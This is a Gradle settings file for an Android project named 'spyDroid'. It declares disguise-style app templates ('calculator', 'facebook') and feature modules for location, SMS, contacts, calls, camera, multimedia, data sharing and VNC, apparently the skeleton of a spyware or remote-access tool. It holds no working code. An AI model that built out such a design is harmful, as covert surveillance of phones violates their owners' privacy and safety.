/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}

// App
include(":app")

// Templates
include(":templates")

// Sample
include(":templates:sample")
include(":templates:sample:app")

// Default
include(":templates:default")
include(":templates:default:core-data")
include(":templates:default:core-database")
include(":templates:default:app")

// Calculator
include(":templates:calculator")
include(":templates:calculator:app")

// Facebook
include(":templates:facebook")
include(":templates:facebook:core-ui")
include(":templates:facebook:app")

// Common
include(":common")

// Manager Features
include(":manager-features")

// Features
include(":features")

// Location
include(":features:location")
// Sms
include(":features:sms")
// Share Data
include(":features:sharedata")

// Multimedia
include(":features:multimedia")

// Camera
include(":features:camera")

// Contacts
include(":features:contacts")

// Calls
include(":features:calls")

// Vnc
include(":features:vnc")

// Project
rootProject.name = "spyDroid"






